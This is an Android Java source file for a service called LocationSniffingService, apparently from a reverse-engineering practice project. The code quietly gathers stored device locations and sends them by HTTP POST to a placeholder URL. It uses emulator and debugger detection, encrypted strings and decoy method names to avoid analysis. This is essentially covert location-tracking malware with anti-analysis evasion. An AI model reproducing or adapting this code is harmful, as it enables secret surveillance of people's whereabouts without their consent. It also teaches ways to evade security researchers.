package com.woop.tryreverseengineerthis.service;

import android.annotation.TargetApi;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Debug;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.woop.tryreverseengineerthis.helper.StringHelper;
import com.woop.tryreverseengineerthis.storage.LocationStorage;

import org.json.JSONException;
import org.json.JSONObject;
import org.apache.http.*;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.InvalidKeyException;
import java.util.List;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;

import static android.location.LocationManager.*;

/**
 * Created by Jay on 3/29/2016.
 */
public class LocationSniffingService extends Service{

    private final static String fingerprintStart = "generic";
    private final static String TAG = "LocationSniffingService";
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate(){

        Handler handler = new Handler();
        int delay = 300000;

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if(thisDoesnotDoAnything())
                    return;
                else
                    thisAlsoDoesnotDoAnything();
            }
        }, delay);
    }

    private void thisAlsoDoesnotDoAnything(){

    }

    private boolean sendQuietly() {

        List<Location> locations = LocationStorage.getAllLocation();
        StringBuilder builder = new StringBuilder();
        for(Location loc : locations){
            builder.append(loc.getAltitude());
            builder.append(",");
            builder.append(loc.getLatitude());
            builder.append(",");
            builder.append(loc.getLongitude());
            builder.append(",");
            builder.append(loc.getTime());
            builder.append(",");
            builder.append("||");
        }

        sendForReals(builder.toString());

        return builder.length() > 2 ? false : (builder.equals(builder) ? true : false);
    }

    @TargetApi(Build.VERSION_CODES.KITKAT)
    private void sendForReals(String s) {
        try {
            URL url = new URL("toBeChanged");
            byte[] postData = s.getBytes(StandardCharsets.UTF_8);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setInstanceFollowRedirects(false);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Content-Length", Integer.toString(postData.length));
            connection.setUseCaches(false);
            try(DataOutputStream wr = new DataOutputStream(connection.getOutputStream())){
                wr.write(postData);
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
            return;
        } catch (IOException e) {
            e.printStackTrace();
            return;
        }
        Log.d(TAG, "Sent");
    }

    private boolean thisDoesnotDoAnything(){

        boolean b = false;

        if (isValid())
            b = sendQuietly();

        return (b^=b) ? (b == b)^(b == (b^=b^=b^=b)) : (b^b^b^b);
    }

    private boolean isValid(){

        String h1 = "ï<ŠPSÒí¸U1Éà>";
        String k1 = "LetmeTellyoua211";
        String h2 = "ÅhÐ$ h~;ï";
        String k2 = "astoryab0utab0y1";
        String h3 = "›«žòóÎÑãl(!º v";
        String k3 = "n4m3dJackJackJac";
        String h4 = "óê|Ø†5{•§YúÙ7";
        String k4 = "heW4sStudying343";
        String h5 = "j·Òsèfh»oÀ/û¦ˆ“";
        String k5 = "s0ftw4r3Engineer";
        String h6 = "vC&Á.ÌŸ/êäÛØp-";
        String k6 = "j0kessjac21saaaa";
        String h7 = "¶²=¼†),¼ýh9ÕRs¼";
        String k7 = "fr33S0ulllllllll";
        String h8 = "ýxç°|œš14ŽÇ_ü";
        String k8 = "ind33dind33d3333";
        String h9 = "ÿRÐÙŒœKÊ¹Ü!Æ4ã%";
        String k9 = "imtired.........";
        String h10 = "ôô}]¯Ý.l¥h¤¼|‡";
        String k10 = "..a..l0ng..night";
        String h11 = "ˆþŒÀyD!»Vj_$™A";
        String k11 = "...timetosleep..";

        String fingerprint = "";
        String model = "";
        String manufacturer = "";
        String product = "";
        String hardware = "";
        String telephonyservice = "";
        String connectivityservice = "";
        String locationservice = "";
        String gpsprovider = "";
        String networkprovider = "";
        String telephoneoperator = "";
        try {
            fingerprint = StringHelper.getStringDynamic(h1, k1);
            model = StringHelper.getStringDynamic(h2, k2);
            manufacturer = StringHelper.getStringDynamic(h3, k3);
            product = StringHelper.getStringDynamic(h4, k4);
            hardware = StringHelper.getStringDynamic(h5, k5);
            telephonyservice = StringHelper.getStringDynamic(h6, k6);
            connectivityservice = StringHelper.getStringDynamic(h7, k7);
            locationservice = StringHelper.getStringDynamic(h8, k8);
            gpsprovider = StringHelper.getStringDynamic(h9, k9);
            networkprovider = StringHelper.getStringDynamic(h10, k10);
            telephoneoperator = StringHelper.getStringDynamic(h11, k11);
        } catch (InvalidKeyException e) {
            e.printStackTrace();
            return false;
        } catch (BadPaddingException e) {
            e.printStackTrace();
            return false;
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
            return false;
        }

        String a1 = "";
        String a2 = "";
        String a3 = "";
        String a4 = "";
        String a5 = "";
        String a6 = "";
        String a7 = "";

        //Check build's fingerprint
        Boolean checkFingerprint =  fingerprint.startsWith("generic") ||
                fingerprint.startsWith("unknown");

        //Check build's model
        Boolean checkModel =        model.contains("google_sdk") ||
                model.contains("Emulator") ||
                model.contains("Android SDK built for x86");

        //Check Manurfacturer for Genymotion (an emulation software)
        Boolean checkManufacturer = manufacturer.contains("Genymotion") ||
                manufacturer.contains("unknown");

        //Check build's product
        Boolean checkProduct = product.contains("google_sdk") ||
                product.contains("sdk") ||
                product.contains("sdk_x86") ||
                product.contains("vbox86p") ||
                product.contains("google_sdk");

        //Check for goldfish hardware
        Boolean checkHardware = hardware.contains("goldfish") ||
                hardware.contains("vbox86");

        //Return if any is detected
        if(checkFingerprint || checkModel || checkManufacturer || checkProduct || checkHardware)
            return false;

        //Check for telephone operator
        //Return if it is android
        if("Android".equals(telephoneoperator))
            return false;

        //Return if debugger is connected
        if(Debug.isDebuggerConnected())
            return false;

        ConnectivityManager connectivityManager = (ConnectivityManager)
                getSystemService(connectivityservice);

        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();

        //Return if internet is not connected
        if(networkInfo == null || !(networkInfo.isConnected()))
            return false;


        LocationManager locationManager = (LocationManager)
                getSystemService(locationservice);

        boolean gps_enabled = false;
        boolean network_enabled = false;

        if(locationManager==null)
            locationManager = (LocationManager) this.getSystemService(locationservice);
        try{
            gps_enabled = locationManager.isProviderEnabled(gpsprovider);
        }catch(Exception ex){}
        try{
            network_enabled = locationManager.isProviderEnabled(networkprovider);
        }catch(Exception ex){}

        //If location service is not enabled don't bother
        if(!gps_enabled && !network_enabled)
            return false;

        return true;
    }

}
